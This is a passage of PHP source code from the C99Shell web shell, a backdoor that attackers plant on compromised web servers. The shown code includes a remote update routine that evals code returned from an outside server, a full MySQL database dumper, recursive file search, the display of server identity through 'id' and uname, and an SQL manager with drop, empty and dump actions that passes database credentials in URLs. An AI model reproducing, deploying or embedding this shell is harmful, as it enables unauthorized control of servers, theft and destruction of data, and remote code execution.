     if (!$fp) {return "Local error: can't write update to __FILE__! You may download c99shell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
     else {fwrite($fp,$source); fclose($fp); return "Thanks! Updated with success.";}
    }
   }
   else {return "New version are available: ".$string[1];}
  }
  elseif ($data{0} == "\x99" and $data{1} == "\x04") {eval($string); return 1;}
  else {return "Error in protocol: segmentation failed! (".$data.") ";}
 }
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 global $shver;
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 $ret["err"] = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = 0;}
 if (empty($add_drop)) {$add_drop = true;}
 if (empty($file))
 {
  $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = true;}
 if (sizeof($tabs) == 0)
 {
  // retrive tables-list
  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 $out = "# Dumped by C99Shell.SQL v. ".$shver."
# Home page: http://ccteam.ru
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
# Date: ".date("d.m.Y H:i:s")."
# DB: \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
   // recieve query for create table structure
   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
   if (!$res) {$ret["err"][] = mysql_smarterror();}
   else
   {
    $row = mysql_fetch_row($res);
    $out .= $row["1"].";\n\n";
    // recieve table variables
    $res = mysql_query("SELECT * FROM `$tab`", $sock);
    if (mysql_num_rows($res) > 0)
    {
     while ($row = mysql_fetch_assoc($res))
     {
      $keys = implode("`, `", array_keys($row));
      $values = array_values($row);
      foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
      $values = implode("', '", $values);
      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
      $out .= $sql;
     }
    }
   }
  }
 }
 $out .= "#---------------------------------------------------------------------------------\n\n";
 if ($file)
 {
  $fp = fopen($file, "w");
  if (!$fp) {$ret["err"][] = 2;}
  else
  {
   fwrite ($fp, $out);
   fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $out;
}
}
if (!function_exists("mysql_buildwhere"))
{
function mysql_buildwhere($array,$sep=" and",$functs=array())
{
 if (!is_array($array)) {$array = array();}
 $result = "";
 foreach($array as $k=>$v)
 {
  $value = "";
  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
  $value .= "'".addslashes($v)."'";
  if (!empty($functs[$k])) {$value .= ")";}
  $result .= "`".$k."` = ".$value.$sep;
 }
 $result = substr($result,0,strlen($result)-strlen($sep));
 return $result;
}
}
if (!function_exists("mysql_fetch_all"))
{
function mysql_fetch_all($query,$sock)
{
 if ($sock) {$result = mysql_query($query,$sock);}
 else {$result = mysql_query($query);}
 $array = array();
 while ($row = mysql_fetch_array($result)) {$array[] = $row;}
 mysql_free_result($result);
 return $array;
}
}
if (!function_exists("mysql_smarterror"))
{
function mysql_smarterror($type,$sock)
{
 if ($sock) {$error = mysql_error($sock);}
 else {$error = mysql_error();}
 $error = htmlspecialchars($error);
 return $error;
}
}
if (!function_exists("mysql_query_form"))
{
function mysql_query_form()
{
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act))
 {
  echo "<table border=0><tr><td><form action=\"".$sql_surl."\" name=\"c99sh_sqlquery\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=\"sql_act\" value=\"query\"><input type=hidden name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=submit value=\"No\"></form></td>";
  if ($tbl_struct)
  {
   echo "<td valign=\"top\"><b>Fields:</b><br>";
   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "» <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
   echo "</td></tr></table>";
  }
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
}
if (!function_exists("mysql_create_db"))
{
function mysql_create_db($db,$sock="")
{
 $sql = "CREATE DATABASE `".addslashes($db)."`;";
 if ($sock) {return mysql_query($sql,$sock);}
 else {return mysql_query($sql);}
}
}
if (!function_exists("mysql_query_parse"))
{
function mysql_query_parse($query)
{
 $query = trim($query);
 $arr = explode (" ",$query);
 /*array array()
 {
  "METHOD"=>array(output_type),
  "METHOD1"...
  ...
 }
 if output_type == 0, no output,
 if output_type == 1, no output if no error
 if output_type == 2, output without control-buttons
 if output_type == 3, output with control-buttons
 */
 $types = array(
  "SELECT"=>array(3,1),
  "SHOW"=>array(2,1),
  "DELETE"=>array(1),
  "DROP"=>array(1)
 );
 $result = array();
 $op = strtoupper($arr[0]);
 if (is_array($types[$op]))
 {
  $result["propertions"] = $types[$op];
  $result["query"]  = $query;
  if ($types[$op] == 2)
  {
   foreach($arr as $k=>$v)
   {
    if (strtoupper($v) == "LIMIT")
    {
     $result["limit"] = $arr[$k+1];
     $result["limit"] = explode(",",$result["limit"]);
     if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
     unset($arr[$k],$arr[$k+1]);
    }
   }
  }
 }
 else {return false;}
}
}
if (!function_exists("c99fsearch"))
{
function c99fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $search_i_f;
 global $search_i_d;
 global $a;
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($f = readdir($h)) !== false)
 {
  if($f != "." && $f != "..")
  {
   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== false) || ($a["name_regexp"] and ereg($a["name"],$f));
   if (is_dir($d.$f))
   {
    $search_i_d++;
    if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
    if (!is_link($d.$f)) {c99fsearch($d.$f);}
   }
   else
   {
    $search_i_f++;
    if ($bool)
    {
     if (!empty($a["text"]))
     {
      $r = @file_get_contents($d.$f);
      if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
      if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
      else {$bool = strpos(" ".$r,$a["text"],1);}
      if ($a["text_not"]) {$bool = !$bool;}
      if ($bool) {$found[] = $d.$f; $found_f++;}
     }
     else {$found[] = $d.$f; $found_f++;}
    }
   }
  }
 }
 closedir($h);
}
}
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}
//Sending headers
@ob_start();
@ob_implicit_flush(0);
function onphpshutdown()
{
 global $gzipencode,$ft;
 if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad")))
 {
  $v = @ob_get_contents();
  @ob_end_clean();
  @ob_start("ob_gzHandler");
  echo $v;
  @ob_end_flush();
 }
}
function c99shexit()
{
 onphpshutdown();
 exit;
}
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
if (empty($tmpdir))
{
 $tmpdir = ini_get("upload_tmp_dir");
 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
}
$tmpdir = realpath($tmpdir);
$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
else {$tmpdir_logs = realpath($tmpdir_logs);}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=red>ON (secure)</font>";
}
else {$safemode = false; $hsafemode = "<font color=green>OFF (not secure)</font>";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=red>".$v."</font>";}
else {$openbasedir = false; $hopenbasedir = "<font color=green>OFF (not secure)</font>";}
$sort = htmlspecialchars($sort);
if (empty($sort)) {$sort = $sort_default;}
$sort[1] = strtolower($sort[1]);
$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
@ini_set("highlight.bg",$highlight_bg); //FFFFFF
@ini_set("highlight.comment",$highlight_comment); //#FF8000
@ini_set("highlight.default",$highlight_default); //#0000BB
@ini_set("highlight.html",$highlight_html); //#000000
@ini_set("highlight.keyword",$highlight_keyword); //#007700
@ini_set("highlight.string",$highlight_string); //#DD0000
if (!is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>C99Shell v. <?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\\\\","\\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r.DIRECTORY_SEPARATOR;
  if ($j == $i) {break;}
  $j++;
 }
 echo "<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";
 $i++;
}
echo "&nbsp;&nbsp;&nbsp;";
if (is_writable($d))
{
 $wd = true;
 $wdt = "<font color=green>[ ok ]</font>";
 echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";
}
else
{
 $wd = false;
 $wdt = "<font color=red>[ Read-Only ]</font>";
 echo "<b>".view_perms_color($d)."</b>";
}
if (is_callable("disk_free_space"))
{
 $free = disk_free_space($d);
 $total = disk_total_space($d);
 if ($free === false) {$free = 0;}
 if ($total === false) {$total = 0;}
 if ($free < 0) {$free = 0;}
 if ($total < 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
 echo "<br><b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";
}
echo "<br>";
$letters = "";
if ($win)
{
 $v = explode("\\",$d);
 $v = $v[0];
 foreach (range("a","z") as $letter)
 {
  $bool = $isdiskette = in_array($letter,$safemode_diskettes);
  if (!$bool) {$bool = is_dir($letter.":\\");}
  if ($bool)
  {
   $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">[ ";
   if ($letter.":" != $v) {$letters .= $letter;}
   else {$letters .= "<font color=green>".$letter."</font>";}
   $letters .= " ]</a> ";
  }
 }
 if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."<br>";}
}
if (count($quicklaunch) > 0)
{
 foreach($quicklaunch as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%sort",$sort,$item[1]);
  $v = realpath($d."..");
  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
  $item[1] = str_replace("%upd",urlencode($v),$item[1]);
  echo "<a href=\"".$item[1]."\">".$item[0]."</a>&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}
echo "</p></td></tr></table><br>";
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}
echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">";
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 $sql_surl = $surl."act=sql";
 if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
 echo "<h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><td width=\"100%\" height=1 colspan=2 valign=top><center>";
 if ($sql_server)
 {
  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
  $err = mysql_smarterror();
  @mysql_select_db($sql_db,$sql_sock);
  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
 }
 else {$sql_sock = false;}
 echo "<b>SQL Manager:</b><br>";
 if (!$sql_sock)
 {
  if (!$sql_server) {echo "NO CONNECTION";}
  else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
 }
 else
 {
  $sqlquicklaunch = array();
  $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
  $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
  $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
  $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
  $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
  $sqlquicklaunch[] = array("Logout",$surl."act=sql");
  echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";
  if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><b>".$item[0]."</b></a> ] ";}}
  echo "</center>";
 }
 echo "</td></tr><tr>";
 if (!$sql_sock) {?><td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form><input type=hidden name=act value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type=submit value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php }
 else
 {
  //Start left panel
  if (!empty($sql_db))
  {
   echo "<td width=\"25%\" height=\"100%\" valign=\"top\"><a href=\"".$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&\"><b>Home</b></a><hr size=\"1\" noshade>";
   $result = mysql_list_tables($sql_db);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
    $c = 0;
    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
    if (!$c) {echo "No tables found in database.";}
   }
  }
  else
  {
   echo "<td width=1 height=100 valign=top><a href=\"".$sql_surl."\"><b>Home</b></a><hr size=1 noshade>";
   $result = mysql_list_dbs($sql_sock);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    echo "<form action=\"".$surl."\"><input type=hidden name=act value=sql><input type=hidden name=sql_login value=\"".htmlspecialchars($sql_login)."\"><input type=hidden name=sql_passwd value=\"".htmlspecialchars($sql_passwd)."\"><input type=hidden name=sql_server value=\"".htmlspecialchars($sql_server)."\"><input type=hidden name=sql_port value=\"".htmlspecialchars($sql_port)."\"><select name=sql_db>";
    $c = 0;
    $dbs = "";
    while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}
    echo "<option value=\"\">Databases (".$c.")</option>";
    echo $dbs;
   }
   ?></select><hr size=1 noshade>Please, select database<hr size=1 noshade><input type=submit value="Go"></form><?php
  }
  //End left panel
  echo "</td><td width=\"100%\" height=1 valign=top>";
  //Start center panel
  $diplay = true;
  if ($sql_db)
  {
   if (!is_numeric($c)) {$c = 0;}
   if ($c == 0) {$c = "no";}
   echo "<hr size=1 noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
   if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
   echo "</b></center>";
   $acts = array("","dump");
   if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
   elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
   elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
   elseif ($sql_tbl_act == "insert")
   {
    if ($sql_tbl_insert_radio == 1)
    {
     $keys = "";
     $akeys = array_keys($sql_tbl_insert);
     foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
     if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
     $values = "";
     $i = 0;
     foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
     if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
     $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
    elseif ($sql_tbl_insert_radio == 2)
    {
     $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
     $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
     $result = mysql_query($sql_query) or print(mysql_smarterror());
     $result = mysql_fetch_array($result, MYSQL_ASSOC);
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
   }
   if ($sql_act == "query")
   {
    echo "<hr size=\"1\" noshade>";
    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
    if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=\"sql_act\" value=\"query\"><input type=hidden name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=submit value=\"No\"></form></td></tr></table>";}
   }
   if (in_array($sql_act,$acts))
   {
    ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="sql"><input type=hidden name="sql_act" value="newtbl"><input type=hidden name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type=hidden name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type=hidden name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type=hidden name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type=hidden name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type=submit value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="sql"><input type=hidden name="sql_act" value="dump"><input type=hidden name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type=hidden name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type=hidden name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type=hidden name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type=hidden name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type=submit name=submit value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td 